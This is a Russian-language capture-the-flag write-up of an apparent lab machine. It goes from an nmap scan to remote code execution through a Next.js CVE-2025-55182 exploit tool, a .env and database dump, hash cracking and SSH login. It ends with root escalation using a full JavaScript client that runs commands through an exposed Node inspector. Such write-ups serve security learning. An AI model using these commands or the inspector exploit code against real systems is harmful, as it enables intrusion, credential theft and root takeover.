Для начала я выполнил сканирование через nmap
```
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up)
```

Далее уточнил сервисы и версии, но второй порт так и не распознался.
```
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
3000/tcp open  ppp?
1 service unrecognized despite returning data.
```

Смотря на отпечаток, по нему можно понять, что это веб-приложение на Next.js, значит можно перейти туда через браузер
```
SF-Port3000-TCP:V=7.95%I=7%D=6/6%Time=6A23E398%P=x86_64-pc-linux-gnu%r(Get
SF:Request,34BC,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-St
SF:ate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x20
SF:Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\r
SF:\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nCa
SF:che-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20171
SF:75\r\nDate:\x20Sat,\x2006\x20Jun\x202026\x2009:08:39\x20GMT\r\nConnecti
SF:on:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta\
SF:x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\"
SF:/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next\"/>
SF:<link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\x20h
SF:ref=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\x20s
SF:rc=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=\"\"
SF:></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead1\.j
SF:s\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOption
SF:s,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Rout
SF:er-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch
SF:\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20no
SF:-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Sat,\
SF:x2006\x20Jun\x202026\x2009:08:41\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RS
SF:C,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-S
SF:egment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x2
SF:0private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\
SF:nDate:\x20Sat,\x2006\x20Jun\x202026\x2009:08:41\x20GMT\r\nConnection:\x
SF:20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Connection:\x20close\r\n\r\n");
```
Далее я перешел на веб-приложение

![](../images/Pasted%20image%2020260606132145.png)

В исходном коде, я увидел, что подгружается этот файл, это минимизированный js код:
```
http://10.129.10.196:3000/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js
```

Далее я придал ему красивый вид и изучил. В нем я увидел использование react версии 19.0.0-rc-66855b96-20241106. Посмотрев об этой версии я увидел, что эта конкретная RC-версия активно использовалась в экосистеме для тестирования совместимости. По сути она является **версией для совместимости с Next.js 15**

![](../images/Pasted%20image%2020260606133325.png)

Изучив next.js 15 версии я нашел, что там есть уязвимость CVE-2025-55182, позволяющая получить RCE.
Далее я скачал эксплоит и попробовал выполнить команду. Команда успешно выполнилась.

![](../images/Pasted%20image%2020260606134624.png)

Следующим шагом я через RCE начал изучать систему, посмотрел какие есть файлы там, где я нахожусь.

![](../images/Pasted%20image%2020260606135437.png)

Посмотрел файл окружения и увидел, что у нас есть БД по пути /opt/reactor-app/reactor.db, и СУБД sqlite3
```
└─$ ./react2shell -u http://10.129.10.196:3000 -c "cat /opt/reactor-app/.env"
# ReactorWatch Configuration\n# Database connection for sensor data\n\nDB_PATH=/opt/reactor-app/reactor.db\nDB_TYPE=sqlite3\n\n# API Keys\nSENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k\nALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook\n\n# Node environment\nNODE_ENV=production
```

Через base64 получил этот файл себе
```
└─$ ./react2shell -u http://10.129.10.196:3000 -c "base64 -w 0 /opt/reactor-app/reactor.db"
U1FMaXRlIGZvcm1hdCAzABAAAQEAQCAgAAAABwAAAAMAAAAAAAAAAAAAAAIAAAAEAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHAC52iQ0AAAACDooAD1AOigAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
```

После дампа БД я нашел там два хэша для пользователей admin и engineer.  

![](../images/Pasted%20image%2020260606135901.png)

С помощью crackstation получилось подобрать пароль к инжинеру

![](../images/Pasted%20image%2020260606140019.png)

Далее я зашел через shh и прочитал флаг пользователя.

![](../images/Pasted%20image%2020260606140127.png)

На этом моменте я потратил огромное количество времени, пока искал пути эскалации привилегий.

Со временем я нашел, что у нас есть /usr/bin/node и он запущен от лица рута с настройкой --inspect и слушается на порту 9229

```
ps aux | grep -E 'inspect|node' | paste -sd,
node        1417  0.5  3.2 11810432 129836 ?     Ssl  09:04   1:15 next-server (v15.0.3),root        1419  0.0  1.1 1066804 47376 ?       Ssl  09:04   0:01 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js,node       46568  0.0  0.0   7340  3868 ?        S    12:21   0:00 /bin/bash /tmp/shell.sh,node       46569  0.0  0.1   8544  5512 ?        S    12:21   0:00 bash -i,node       46729  800  0.1  11016  4556 ?        R    12:35   0:00 ps aux,node       46730  0.0  0.0   6676  2280 ?        S    12:35   0:00 grep --color=auto -E inspect|node,node       46731  0.0  0.0   5688  1932 ?        S    12:35   0:00 paste -sd,
```

Чтобы отправить `Runtime.evaluate` команду в инспектор, нам нужен клиент WebSocket. Пакета `ws` npm нет в целевом репозитории, поэтому мы напишем его с нуля, используя только встроенные функции Node.js: `net` для TCP-соединения и `crypto` для маскировки фреймов WebSocket.

Код который сработал, запустив этот код я увидел что он реально работает от лица рута:
```
const net = require('net');
const crypto = require('crypto');

const WS_ID = 'bf1fa546-67f1-41b6-a668-74b4972aa9f2';
const CMD = 'process.mainModule.require("child_process").execSync("id").toString()';

function encodeFrame(data) {
  const payload = Buffer.from(data, 'utf8');
  const mask = crypto.randomBytes(4);
  let headerLen = (payload.length < 126) ? 6 : 8;
  const header = Buffer.alloc(headerLen);
  header[0] = 0x81;
  if (payload.length < 126) {
    header[1] = 0x80 | payload.length;
    mask.copy(header, 2);
  } else {
    header[1] = 0xfe;
    header.writeUInt16BE(payload.length, 2);
    mask.copy(header, 4);
  }
  const masked = Buffer.alloc(payload.length);
  const maskStart = headerLen - 4;
  for (let i = 0; i < payload.length; i++) {
    masked[i] = payload[i] ^ header[maskStart + (i % 4)];
  }
  return Buffer.concat([header, masked]);
}

const sock = net.createConnection({ port: 9229, host: '127.0.0.1' });
let upgraded = false, chunks = Buffer.alloc(0);

sock.on('connect', () => {
  sock.write(
    `GET /${WS_ID} HTTP/1.1\r\n` +
    `Host: 127.0.0.1:9229\r\n` +
    `Upgrade: websocket\r\n` +
    `Connection: Upgrade\r\n` +
    `Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n` +
    `Sec-WebSocket-Version: 13\r\n\r\n`
  );
});

sock.on('data', (data) => {
  chunks = Buffer.concat([chunks, data]);
  if (!upgraded) {
    const str = chunks.toString('utf8');
    const sep = str.indexOf('\r\n\r\n');
    if (sep === -1) return;
    upgraded = true;
    chunks = chunks.slice(Buffer.byteLength(str.slice(0, sep + 4)));
    const msg = JSON.stringify({
      id: 1,
      method: 'Runtime.evaluate',
      params: { expression: CMD, returnByValue: true }
    });
    sock.write(encodeFrame(msg));
    return;
  }
  while (chunks.length > 2) {
    const b1 = chunks[1] & 0x7f;
    let payloadStart, payloadLen;
    if (b1 < 126) { payloadLen = b1; payloadStart = 2; }
    else { if (chunks.length < 4) return; payloadLen = chunks.readUInt16BE(2); payloadStart = 4; }
    if (chunks.length < payloadStart + payloadLen) return;
    process.stdout.write(chunks.slice(payloadStart, payloadStart + payloadLen).toString() + '\n');
    sock.destroy();
    process.exit(0);
  }
});

sock.on('error', (e) => { process.stderr.write(e.message + '\n'); process.exit(1); });
setTimeout(() => { process.stderr.write('timeout\n'); process.exit(1); }, 8000);
```

Изменяем команду в скрипте на прочтение флага

![](../images/Pasted%20image%2020260606165013.png)

Запускаем и читаем флаг рута

![](../images/Pasted%20image%2020260606165043.png)

